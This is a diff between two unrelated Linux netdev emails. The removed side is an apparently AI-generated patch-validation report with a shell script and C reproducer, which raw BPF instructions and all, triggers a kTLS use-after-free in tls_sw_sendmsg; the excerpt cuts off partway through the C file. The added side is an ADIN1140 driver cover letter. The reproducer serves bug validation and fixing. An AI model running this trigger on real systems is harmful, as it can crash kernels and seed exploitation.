@@ -1,623 +1,209 @@
-Received: from out30-99.freemail.mail.aliyun.com (out30-99.freemail.mail.aliyun.com [115.124.30.99])
+Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0B5BD36607C;
-	Tue,  9 Jun 2026 15:26:23 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=115.124.30.99
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 550A11AA7A6;
+	Tue,  9 Jun 2026 15:28:09 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1781018790; cv=none; b=SoKqsQmkjDZ7Y3L12xMc/ZkAOBFBZS2jcFXHwLcZ3WcBbMYgkNmF9mK79r/n6VJgxp0VuPfh5RyP4pR+SNuDrGKx8cLknGJdIO0MUknaqAFnYoANLlux197sJwlxumIWGBGOBH2yLO9Dn0KWXZGEhKRKZ5ysGe0IjwyFCCi0Rwk=
+	t=1781018889; cv=none; b=YW/zBzFFEuPpSJNePj600VonR/sL8ZfuOKBY/9mRZi88uXUQG62EdHGK4JkhxHeeNX6xYvp01PBaAblc9Glr/O7RlDBfWzwCCuClEgZQlToAilDWn6gy7XtSRWFjQc4K2YfwoeDUAT2kPSpCMQOaAICy3smORtgYpw2ymg+TOPA=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1781018790; c=relaxed/simple;
-	bh=F7eqkvbYSOeBp6aYZFkKstB0+Z7c6VHnKb0R7eniyrc=;
-	h=From:To:Cc:Subject:In-Reply-To:References:Date:Message-Id:
-	 Content-Type:MIME-Version; b=bUogKAdmxL+ZpBlYCSw6MDyLYBbRIYNYpQYbP0igr2+f3+kGcfJJTpqyEHuFVtUNdOP7qpv03ZGAblftJNqd1PXQJtJQf1k1UgPQQihjN+86dBu9JGpLrjl70JfdUUCFPyh2H3P/ZOCKj2R0af0s60SJZnc+uR17kvV7ymoxDOc=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.alibaba.com; spf=pass smtp.mailfrom=linux.alibaba.com; dkim=pass (1024-bit key) header.d=linux.alibaba.com header.i=@linux.alibaba.com header.b=t1fBsLOT; arc=none smtp.client-ip=115.124.30.99
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.alibaba.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linux.alibaba.com
+	s=arc-20240116; t=1781018889; c=relaxed/simple;
+	bh=uTSgo2Hade6Jh/MPlBgc5FQy3Tx8XXA5YulUFieVPjM=;
+	h=From:Subject:Date:Message-Id:MIME-Version:Content-Type:To:Cc; b=UYXlWGEK1WayZmBj0werJHmCRXUCBGiFa/ZrHxCx09ClD1WrH2QlLkOpa4Xk+m8lzOCu2E4laD6Y5O6hJvJsO4Fx/pBk27L7C7ECTfHoGbcCHLxCkmeMxz5covPkfAo4iMAxBp8/9tZ09U9wfjcXp4MVi2F4zQiVC3xbtQKRH0Q=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=g+KlIphO; arc=none smtp.client-ip=10.30.226.201
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linux.alibaba.com header.i=@linux.alibaba.com header.b="t1fBsLOT"
-DKIM-Signature:v=1; a=rsa-sha256; c=relaxed/relaxed;
-	d=linux.alibaba.com; s=default;
-	t=1781018780; h=From:To:Subject:Date:Message-Id:Content-Type:MIME-Version;
-	bh=O55iUPLS8CD9A19UQnznUW9jhOsY23zIP2oD3XEQlXM=;
-	b=t1fBsLOTmLopwUFwgMC5UpBHwvkH94Ny0bxLTjPpelP2tWarg5rvo8SxoSo/B+BYSsiGIhlUG3PS9sb085RZfrS+rDYLmxndHsRDVWvnf7+YTnUEre6r2qpVvQoMW/pmsTl1et0+huR653FLRzs30aLnSOxGDXRoiC13nfRSrPI=
-X-Alimail-AntiSpam:AC=PASS;BC=-1|-1;BR=01201311R101e4;CH=green;DM=||false|;DS=||;FP=0|-1|-1|-1|0|-1|-1|-1;HT=maildocker-contentspam033037009110;MF=abaci@linux.alibaba.com;NM=1;PH=DS;RN=14;SR=0;TI=SMTPD_---0X4WwTDQ_1781018779;
-Received: from x31j01071.sqa.na131(mailfrom:abaci@linux.alibaba.com fp:SMTPD_---0X4WwTDQ_1781018779 cluster:ay36)
-          by smtp.aliyun-inc.com;
-          Tue, 09 Jun 2026 23:26:20 +0800
-From: abaci-kreproducer <abaci@linux.alibaba.com>
-To: Sechang Lim <rhkrqnwk98@gmail.com>
-Cc: John Fastabend <john.fastabend@gmail.com>,
- Jakub Kicinski <kuba@kernel.org>, Sabrina Dubroca <sd@queasysnail.net>,
- David S . Miller <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>,
- Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>,
- Jiayuan Chen <jiayuan.chen@linux.dev>, Alexei Starovoitov <ast@kernel.org>,
- netdev@vger.kernel.org, bpf@vger.kernel.org, linux-kernel@vger.kernel.org,
- Oliver <oliver.yang@linux.alibaba.com>
-Subject:
- Re: [PATCH net] tls: fix use-after-free in tls_sw_sendmsg() cork error path
-In-Reply-To: <20260605214802.1647008-1-rhkrqnwk98@gmail.com>
-References: <20260605214802.1647008-1-rhkrqnwk98@gmail.com>
-Date: Tue, 09 Jun 2026 23:25:56 +0800
-Message-Id: <178101875671.841617.9555980064609175426@linux.alibaba.com>
-User-Agent: abaci-kreproducer (abaci-oracle mail_sender)
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: quoted-printable
+	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="g+KlIphO"
+Received: by smtp.kernel.org (Postfix) with ESMTPS id 1B3A4C2BCB4;
+	Tue,  9 Jun 2026 15:28:09 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
+	s=k20201202; t=1781018889;
+	bh=uTSgo2Hade6Jh/MPlBgc5FQy3Tx8XXA5YulUFieVPjM=;
+	h=From:Subject:Date:To:Cc:Reply-To:From;
+	b=g+KlIphOzDHYTokstbBZ20/mw8pAcVRoMzNZjB6X/qNYrGGwpqQK4wM40zqXZzxMh
+	 rePTv4n0Po0mSAhhxwpjxg6zNXbjPI1trArfPG41JhF/EBS3KVCe16EOGFjDLVt46O
+	 3yeh+48p4HkhRiZ2ZCL7YrMjD5ue54Hgy4D0FNkJrzlxcPmbzNww13Ad/o15LAwgFW
+	 y1hJUwtcrsNMX2RsfSleEqYH8eEZwpkscCXCMpZrDWwPbt65nxRSOqJXqLRkfNiq/o
+	 L0UVKiZpVd+j5KmYA4Fe93jSEF/P+p5FOW2yjOkn1V1C2Se9ekewQ4J244eQnmUXzc
+	 uUzYShx9QXVpQ==
+Received: from aws-us-west-2-korg-lkml-1.web.codeaurora.org (localhost.localdomain [127.0.0.1])
+	by smtp.lore.kernel.org (Postfix) with ESMTP id F2115CD8CB9;
+	Tue,  9 Jun 2026 15:28:08 +0000 (UTC)
+From: Ciprian Regus via B4 Relay <devnull+ciprian.regus.analog.com@kernel.org>
+Subject: [PATCH net-next v4 00/13] net: Add ADIN1140 support
+Date: Tue, 09 Jun 2026 18:27:59 +0300
+Message-Id: <20260609-adin1140-driver-v4-0-0753e28ee004@analog.com>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+X-B4-Tracking: v=1; b=H4sIAP8wKGoC/2XPTQrCMBAF4KuUrI0kmfTPlfcQF2lm2gY0lbSES
+ undDdmodDePx3zDbGym4Ghml2JjgaKb3eRT0KeC2dH4gbjDlJkSqhJatdyg81JqwTG4SIG3YEg
+ g1BXIhqWtV6DerVm8MU8L97Qu7J6a0c3LFN75VJS5z2op4KBGydOMQoNFbJpeXI03j2k42+mZs
+ ah+AFUfAZUAqKm0DWoS5gjAF0ifHQFIQInUYQeyBqv/gH3fP/i+Lq07AQAA
+To: Parthiban Veerasooran <parthiban.veerasooran@microchip.com>, 
+ Andrew Lunn <andrew+netdev@lunn.ch>, 
+ "David S. Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, 
+ Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, 
+ Simon Horman <horms@kernel.org>, Jonathan Corbet <corbet@lwn.net>, 
+ Shuah Khan <skhan@linuxfoundation.org>, Andrew Lunn <andrew@lunn.ch>, 
+ Heiner Kallweit <hkallweit1@gmail.com>, 
+ Russell King <linux@armlinux.org.uk>, Rob Herring <robh@kernel.org>, 
+ Krzysztof Kozlowski <krzk+dt@kernel.org>, 
+ Conor Dooley <conor+dt@kernel.org>
+Cc: netdev@vger.kernel.org, linux-kernel@vger.kernel.org, 
+ linux-doc@vger.kernel.org, devicetree@vger.kernel.org, 
+ Ciprian Regus <ciprian.regus@analog.com>, 
+ Conor Dooley <conor.dooley@microchip.com>
+X-Mailer: b4 0.13.0
+X-Developer-Signature: v=1; a=ed25519-sha256; t=1781018886; l=7215;
+ i=ciprian.regus@analog.com; s=20260330; h=from:subject:message-id;
+ bh=uTSgo2Hade6Jh/MPlBgc5FQy3Tx8XXA5YulUFieVPjM=;
+ b=lpraPxnBK11u3SvsfywV/YSzB11DCsePuzIggYV1U5Uw14QcnyqnKqDJASQ0zsZCZUrEyZFTk
+ BgW5ZsUw3UWB7DxGVNdgFUTFLUU9r6TNgV0yAJixLQVpCWv+j5hl+BW
+X-Developer-Key: i=ciprian.regus@analog.com; a=ed25519;
+ pk=8WoNhI0kQcQUl8YqJO5ZevROYk9HP8lOIeIgIYgjfbc=
+X-Endpoint-Received: by B4 Relay for ciprian.regus@analog.com/20260330 with
+ auth_id=703
+X-Original-From: Ciprian Regus <ciprian.regus@analog.com>
+Reply-To: ciprian.regus@analog.com
 
-From: abaci-kreproducer <abaci@linux.alibaba.com>
+This series introduces support for the ADIN1140 (also called AD3306)
+10BASE-T1S single port MACPHY. The device integrates the MAC and PHY in
+the same package. The communication with the host CPU is done through an
+SPI interface, using the Open Alliance TC6 protocol for control and data
+transactions. As a result, the oa_tc6 framework is used to implement
+the communication with the device (register accesses and Ethernet frame
+RX/TX).
 
-This is an AI-generated validation of this patch. The issue was
-reproduced on the unpatched kernel, and the original symptoms were no
-longer observed on the patched kernel. However, additional issues were
-identified during validation (details below).
+The MAC and PHY are connected internally using an MII and MDIO bus.
 
-Tested-by: abaci-kreproducer <abaci@linux.alibaba.com>
+The PHY is a half duplex 10Mbps device, which implements both the PLCA
+RS (IEEE 802.3 clause 148) and CSMA/CD methods of accessing the Ethernet
+medium. The 10BASE-T1S standard allows multiple PHY devices to be
+connected (in parallel) on the same single twisted pair network segment,
+so PLCA can be configured in order to provide a fair access scheme to
+all the nodes and reduce the jitter introduced by the unordered CSMA/CD
+transmits. The PHY's internal register map can be accessed using the
+direct MDIO mode of the OA TC6. The control, status, phy id 1 & 2 C22
+registers are mapped to the 0xFF00 - 0xFF03 range. As for C45
+addressable devices, the PHY has PCS, PMA and PLCA blocks.
+
+The oa_tc6 framework patches are changes that would make the library
+usable by the subsequent ADIN1140 MAC driver.
+
+The protected mode patch is required because the ADIN1140 only allows
+protected mode OA TC6 control transactions, which the oa_tc6 framework
+doesn't currently implement.
+
+The OA_TC6_BROKEN_PHY quirk patch is required in order to allow the MAC
+driver to have a custom implementation for the mii_bus access methods as a
+workaround for hardware issues:
+
+1. The OA TC6 standard defines the direct and indirect access modes for
+   MDIO transactions. The ADIN1140 incorrectly advertises indirect mode
+   only (supported capabilities register - 0x2, bit 9), while actually
+   implementing just the direct mode. We cannot rely on the CAP register
+   to choose an access method (which oa_tc6 does by default, even though
+   it only implements the direct mode), so the driver has to use its
+   own.
+2. The ADIN1140 cannot access the C22 register space of the internal
+   PHY, while the PHY is busy receiving frames. If that happens, the
+   CONFIG0 and CONFIG2 registers of the MAC will get corrupted and the
+   data transfer will stop. Those two registers configure settings for
+   the transfer protocol between the MAC and host, so the value for some
+   of their subfields shouldn't be changed while the netdev is up.
+   Since we know the PHY is internal, the MAC driver can implement a
+   custom mii_bus, which can intercept C22 accesses. Most of the
+   registers mapped in the 0x0 - 0x3 range (the only ones the PHY offers)
+   are read only, and their value can be read from somewhere else (e.g
+   the PHYID 1 & 2 have the same value as 0x1 in the MAC memory map).
+   C45 accesses do not cause this issue, so we can properly implement
+   them.
+
+Even though they have different driver, the MAC one cannot function
+without the PHY driver, since the PHY is not compatible with the generic
+c22 driver. As such CONFIG_ADIN1140 selects CONFIG_ADIN1140_PHY.
+
+Signed-off-by: Ciprian Regus <ciprian.regus@analog.com>
 ---
-We reproduced this issue on the unpatched kernel:
+Changes in v4:
+- Renamed the dt bindings file after the adi,ad3306 compatible.
+- Renamed a few register address macros to match the OA TC6 standard and
+  the ADIN1140 reference manual.
+- Link to v3: https://lore.kernel.org/r/20260604-adin1140-driver-v3-0-5debdb3173c4@analog.com
 
-KASAN reported a slab-use-after-free in tls_sw_sendmsg+0x1df5/0x1f40:
-a 4-byte read of the freed cork_bytes field inside a freed kmalloc-4k
-object.
+Changes in v3:
+- Added adi,ad3306 as a fallback compatible in the DT schema.
+- Keep the current spi_device and net_device parameters for
+  oa_tc6_init() and add a new struct parameter for passing the quirk
+  flags, insted of changing the function to take a single config
+  parameter.
+- Add the oa_tc6_write_register_mms() and oa_tc6_read_register_mms()
+  functions instead of defining a new macro for MMS and register address
+  formatting.
+- Split the OA TC6 register address macro exports patch into two
+  different commits (export + rename).
+- Use the devres API for mii_bus and net_device management in the
+  ADIN1140 driver.
+- Fix a bug related to the destination MAC filter mask in the ADIN1140
+  driver.
+- Link to v2: https://lore.kernel.org/r/20260527-adin1140-driver-v2-0-37e5c8d4e0a0@analog.com
 
-In tls_sw_sendmsg_locked(), msg_pl is cached before bpf_exec_tx_verdict().
-When a BPF SK_MSG program forces a record split via apply_bytes, the
-original tls_rec is freed but msg_pl remains stale. The subsequent
--ENOSPC error path dereferences msg_pl->cork_bytes, triggering UAF.
-
-The reproducer uses a sockmap with an SK_MSG program that sets
-apply_bytes=3D100 and cork_bytes=3D32768. Sending 8KB with MSG_MORE followed
-by 8KB without MSG_MORE triggers the split and stale pointer dereference.
-
-On the patched kernel, no KASAN slab-use-after-free is reported.
-
-Additional issues were identified during validation: the patched kernel
-hits a fatal kernel BUG at lib/iov_iter.c:635 (Oops: invalid opcode) in
-iov_iter_revert+0x39b/0x3e0, called from tls_sw_sendmsg+0x1aac/0x20f0.
-This appears to be a new failure mode exposed by the fix.
-
-    kernel BUG at lib/iov_iter.c:635!
-    Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
-    RIP: 0010:iov_iter_revert+0x39b/0x3e0
-    Call Trace:
-      tls_sw_sendmsg+0x1aac/0x20f0
-      __sys_sendto+0x35b/0x3e0
-      __x64_sys_sendto+0xdc/0x1b0
-      do_syscall_64+0x10d/0x510
-      entry_SYSCALL_64_after_hwframe+0x77/0x7f
+Changes in v2:
+- Add the OA_TC6_BROKEN_PHY quirk flag to the oa_tc6 framework in order
+  to allow ethernet drivers to manage their own mii_bus struct and PHY.
+- Move the OA TC6 standard register definitions in the oa_tc6.h header
+  so other drivers can use them. Do the same for the C45 access
+  functions
+- Add the genphy_read_mmd_c45 and genphy_write_mmd_c45 functions to
+  genphy, which allow drivers that have been discovered over C22 to make
+  direct C45 operations, without using the 0xD and 0xE register. The
+  change was implemented based on the suggestion in this thread:
+  https://lore.kernel.org/all/CY8PR02MB9249CDA8F2C560FDD0F662D883382@CY8PR02MB9249.namprd02.prod.outlook.com/
+- Link to v1: https://lore.kernel.org/r/20260503-adin1140-driver-v1-0-dd043cdd88f0@analog.com
 
 ---
-Key configuration
-* kconfig:
-CONFIG_TLS=3Dy
-CONFIG_BPF_SYSCALL=3Dy
-CONFIG_INET=3Dy
-CONFIG_KASAN=3Dy
-CONFIG_KASAN_GENERIC=3Dy
-CONFIG_KASAN_INLINE=3Dy
-CONFIG_NET_SOCK_MSG=3Dy
-CONFIG_CRYPTO_AES=3Dy
-CONFIG_CRYPTO_GCM=3Dy
-* kernel_cmdline: -
-* rpm package: -
---
-run.sh
-#!/bin/bash
-set -eu
+Ciprian Regus (13):
+      dt-bindings: net: Add ADIN1140
+      net: ethernet: oa_tc6: Handle the OA TC6 SPI protected mode
+      net: ethernet: oa_tc6: add OA_TC6_BROKEN_PHY quirk flag
+      net: ethernet: oa_tc6: Export the C45 access functions
+      net: ethernet: oa_tc6: Export standard defined registers
+      net: ethernet: oa_tc6: Add the OA_TC6_ prefix to standard registers
+      net: ethernet: oa_tc6: Add read_mms/write_mms register access functions
+      net: ethernet: oa_tc6: Use the read_mms/write_mms functions for C45
+      net: ethernet: oa_tc6: Add new register address defines
+      net: phy: add generic helpers for direct C45 MMD access
+      net: phy: microchip-t1s: use generic C45 MMD access helpers
+      net: phy: Add support for the ADIN1140 PHY
+      net: ethernet: adi: Add a driver for the ADIN1140 MACPHY
+
+ .../devicetree/bindings/net/adi,ad3306.yaml        |  71 ++
+ Documentation/networking/oa-tc6-framework.rst      |   3 +-
+ MAINTAINERS                                        |  15 +
+ drivers/net/ethernet/adi/Kconfig                   |  12 +
+ drivers/net/ethernet/adi/Makefile                  |   1 +
+ drivers/net/ethernet/adi/adin1140.c                | 815 +++++++++++++++++++++
+ drivers/net/ethernet/microchip/lan865x/lan865x.c   |   2 +-
+ drivers/net/ethernet/oa_tc6.c                      | 259 ++++---
+ drivers/net/phy/Kconfig                            |   6 +
+ drivers/net/phy/Makefile                           |   1 +
+ drivers/net/phy/adin1140-phy.c                     |  72 ++
+ drivers/net/phy/microchip_t1s.c                    |  32 +-
+ drivers/net/phy/phy_device.c                       |  25 +
+ include/linux/oa_tc6.h                             |  71 +-
+ include/linux/phy.h                                |   3 +
+ 15 files changed, 1261 insertions(+), 127 deletions(-)
+---
+base-commit: 9415471e01c1aaac43daa6af3a261dc0c6c3a47c
+change-id: 20260429-adin1140-driver-93ae0d376318
+
+Best regards,
+-- 
+Ciprian Regus <ciprian.regus@analog.com>
 
-SCRIPT_DIR=3D"$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-BIN_DIR=3D"${SCRIPT_DIR}/bin"
-RESULTS_DIR=3D"${SCRIPT_DIR}/results"
-REPRODUCER_SRC=3D"${BIN_DIR}/reproducer.c"
-REPRODUCER_BIN=3D"${BIN_DIR}/reproducer"
 
-mkdir -p "${RESULTS_DIR}"
-
-echo "=3D=3D=3D TLS kTLS sendmsg cork UAF reproducer =3D=3D=3D"
-echo "Commit: 7723129261d09c9328bd1b332598b9fd465ad823"
-echo ""
-
-echo "[*] Checking kernel config..."
-KCONFIG=3D"$(zcat /proc/config.gz 2>/dev/null || cat /boot/config-$(uname -r)=
- 2>/dev/null || echo "")"
-
-check_config() {
-    echo "$KCONFIG" | grep -cE "$1=3D[ym]" > /dev/null 2>&1
-}
-
-if ! check_config "CONFIG_TLS"; then
-	echo "[!] CONFIG_TLS not enabled. Cannot reproduce."
-	exit 1
-fi
-if ! check_config "CONFIG_BPF_SYSCALL"; then
-	echo "[!] CONFIG_BPF_SYSCALL not enabled. Cannot reproduce."
-	exit 1
-fi
-if ! check_config "CONFIG_NET_SOCK_MSG"; then
-	echo "[!] CONFIG_NET_SOCK_MSG not enabled. Cannot reproduce."
-	exit 1
-fi
-if check_config "CONFIG_KASAN"; then
-	echo "[*] KASAN is enabled (will detect UAF)"
-else
-	echo "[*] WARNING: KASAN not enabled. UAF may not be detected by kernel."
-fi
-
-modprobe tls || true
-
-echo "[*] Compiling reproducer..."
-gcc -o "${REPRODUCER_BIN}" "${REPRODUCER_SRC}" -Wall -O2 -lpthread
-echo "[*] Compiled: ${REPRODUCER_BIN}"
-
-dmesg -C
-
-echo "[*] Running reproducer..."
-"${REPRODUCER_BIN}" 2>&1 | tee "${RESULTS_DIR}/test-output.txt" || true
-
-echo ""
-echo "[*] Collecting dmesg output..."
-dmesg > "${RESULTS_DIR}/dmesg-errors.txt" 2>&1 || true
-
-if dmesg | grep -ciE "KASAN.*use-after-free|slab-use-after-free" | grep -qv "=
-^0$"; then
-	echo ""
-	echo "=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D"
-	echo "  BUG REPRODUCED: KASAN detected UAF!"
-	echo "=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D"
-	echo ""
-	echo "Relevant dmesg lines:"
-	dmesg | grep -iE "BUG:|KASAN:|use-after-free|slab-use-after-free|tls_sw_send=
-msg" | tail -20
-	exit 0
-fi
-
-if dmesg | grep -ciE "Oops|general protection|kernel panic" | grep -qv "^0$";=
- then
-	echo ""
-	echo "=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D"
-	echo "  BUG REPRODUCED: kernel error detected!"
-	echo "=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D"
-	echo ""
-	dmesg | grep -iE "Oops|general protection|kernel panic" | tail -10
-	exit 0
-fi
-
-echo ""
-echo "=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D"
-echo "  Bug NOT detected (KASAN may be required)"
-echo "=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D"
-exit 1
---
-reproducer.c
-/*
- * Reproducer for: tls: fix use-after-free in tls_sw_sendmsg() cork error path
- * Commit: 7723129261d09c9328bd1b332598b9fd465ad823
- *
- * Bug: In tls_sw_sendmsg_locked(), msg_pl is cached from ctx->open_rec before
- * calling bpf_exec_tx_verdict(). When the attached SK_MSG BPF program calls
- * bpf_msg_apply_bytes() + bpf_msg_push_data(), tls_push_record() splits the
- * open record: the original record is encrypted, queued and freed by
- * tls_tx_records(), while ctx->open_rec is replaced by the split remainder.
- * If the BPF program also sets cork_bytes, the second iteration in
- * bpf_exec_tx_verdict() returns -ENOSPC, and the error path dereferences the
- * now-dangling msg_pl (use-after-free).
- *
- * Fix: Re-fetch msg_pl from ctx->open_rec before accessing cork_bytes in
- * the -ENOSPC error path.
- *
- * Trigger:
- *   1. Create TCP socket, add to sockmap with SK_MSG BPF program
- *   2. Enable kTLS TX (AES-GCM-128)
- *   3. BPF program: apply_bytes(100) + push_data(0, 200) + cork_bytes(32768)
- *   4. Send 8KB with MSG_MORE (accumulates data in open record)
- *   5. Send 8KB without MSG_MORE (fills TLS record -> split + cork ENOSPC ->=
- UAF)
- */
-
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <errno.h>
-#include <pthread.h>
-#include <signal.h>
-#include <sys/socket.h>
-#include <sys/syscall.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <linux/tls.h>
-#include <linux/bpf.h>
-
-#ifndef SOL_TLS
-#define SOL_TLS 300
-#endif
-
-#ifndef TLS_1_2_VERSION
-#define TLS_1_2_VERSION 0x0303
-#endif
-
-/* BPF helper function IDs */
-#define BPF_FUNC_msg_apply_bytes 61
-#define BPF_FUNC_msg_cork_bytes  62
-#define BPF_FUNC_msg_push_data   90
-
-#define BPF_JMP     0x05
-#define BPF_ALU     0x04
-#define BPF_ALU64   0x07
-#define BPF_K       0x00
-#define BPF_X       0x08
-#define BPF_MOV     0xb0
-#define BPF_CALL    0x80
-#define BPF_EXIT    0x90
-
-#define SK_PASS 1
-#define NUM_ITERATIONS 3
-#define SEND_SIZE 8192
-
-/*
- * SK_MSG BPF program (raw insns, no clang required):
- *   R6 =3D R1;                                  // save ctx (callee-saved)
- *   R2 =3D 100;  bpf_msg_apply_bytes(ctx, 100); // force record split at 100=
- bytes
- *   R1 =3D R6;                                  // restore ctx after call
- *   R2 =3D 0; R3 =3D 200; R4 =3D 0;
- *   bpf_msg_push_data(ctx, 0, 200, 0);        // grow sg.size beyond encrypt=
-ed buffer
- *   R1 =3D R6;                                  // restore ctx
- *   R2 =3D 32768; bpf_msg_cork_bytes(ctx, 32768); // cork at 32KB
- *   R0 =3D SK_PASS; return SK_PASS;
- *
- * How the UAF is triggered:
- *   1st BPF invocation: apply_bytes=3D100 causes tls_push_record() to split =
-the
- *     open record. The front part (100 bytes) is encrypted, queued, and freed
- *     by tls_tx_records(). ctx->open_rec now points to the split remainder.
- *     push_data(0,200) grows sg.size, ensuring the split triggers correctly.
- *   2nd BPF invocation (on remainder): apply_bytes was consumed (0), so BPF
- *     re-runs. cork_bytes=3D32768 is set. Since 32768 > remainder size and n=
-ot
- *     a full record, bpf_exec_tx_verdict() returns -ENOSPC.
- *   Back in tls_sw_sendmsg_locked(): msg_pl still points to the OLD record
- *     (freed in step 1). Accessing msg_pl->cork_bytes is a use-after-free.
- */
-static struct bpf_insn bpf_prog[] =3D {
-	/* R6 =3D R1 (save ctx to callee-saved register) */
-	{ .code =3D BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg =3D 6, .src_reg =3D 1, .of=
-f =3D 0, .imm =3D 0 },
-	/* bpf_msg_apply_bytes(ctx, 100) */
-	{ .code =3D BPF_ALU | BPF_MOV | BPF_K, .dst_reg =3D 2, .src_reg =3D 0, .off =
-=3D 0, .imm =3D 100 },
-	{ .code =3D BPF_JMP | BPF_CALL, .dst_reg =3D 0, .src_reg =3D 0, .off =3D 0, =
-.imm =3D BPF_FUNC_msg_apply_bytes },
-	/* R1 =3D R6 (restore ctx after call clobbered R1) */
-	{ .code =3D BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg =3D 1, .src_reg =3D 6, .of=
-f =3D 0, .imm =3D 0 },
-	/* bpf_msg_push_data(ctx, offset=3D0, length=3D200, flags=3D0) */
-	{ .code =3D BPF_ALU | BPF_MOV | BPF_K, .dst_reg =3D 2, .src_reg =3D 0, .off =
-=3D 0, .imm =3D 0 },
-	{ .code =3D BPF_ALU | BPF_MOV | BPF_K, .dst_reg =3D 3, .src_reg =3D 0, .off =
-=3D 0, .imm =3D 200 },
-	{ .code =3D BPF_ALU | BPF_MOV | BPF_K, .dst_reg =3D 4, .src_reg =3D 0, .off =
-=3D 0, .imm =3D 0 },
-	{ .code =3D BPF_JMP | BPF_CALL, .dst_reg =3D 0, .src_reg =3D 0, .off =3D 0, =
-.imm =3D BPF_FUNC_msg_push_data },
-	/* R1 =3D R6 (restore ctx) */
-	{ .code =3D BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg =3D 1, .src_reg =3D 6, .of=
-f =3D 0, .imm =3D 0 },
-	/* bpf_msg_cork_bytes(ctx, 32768) */
-	{ .code =3D BPF_ALU | BPF_MOV | BPF_K, .dst_reg =3D 2, .src_reg =3D 0, .off =
-=3D 0, .imm =3D 32768 },
-	{ .code =3D BPF_JMP | BPF_CALL, .dst_reg =3D 0, .src_reg =3D 0, .off =3D 0, =
-.imm =3D BPF_FUNC_msg_cork_bytes },
-	/* return SK_PASS */
-	{ .code =3D BPF_ALU | BPF_MOV | BPF_K, .dst_reg =3D 0, .src_reg =3D 0, .off =
-=3D 0, .imm =3D SK_PASS },
-	{ .code =3D BPF_JMP | BPF_EXIT, .dst_reg =3D 0, .src_reg =3D 0, .off =3D 0, =
-.imm =3D 0 },
-};
-
-static int bpf_prog_fd =3D -1;
-static int map_fd_global =3D -1;
-static volatile int server_done =3D 0;
-
-static int sys_bpf(int cmd, union bpf_attr *attr)
-{
-	return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
-}
-
-static void *server_thread(void *arg)
-{
-	int listen_fd =3D *(int *)arg;
-	char buf[4096];
-
-	int conn_fd =3D accept(listen_fd, NULL, NULL);
-	if (conn_fd < 0) {
-		perror("accept");
-		return NULL;
-	}
-
-	while (!server_done) {
-		ssize_t n =3D read(conn_fd, buf, sizeof(buf));
-		if (n <=3D 0)
-			break;
-	}
-
-	close(conn_fd);
-	return NULL;
-}
-
-static void cleanup(int client_fd, int listen_fd)
-{
-	server_done =3D 1;
-	if (client_fd >=3D 0)
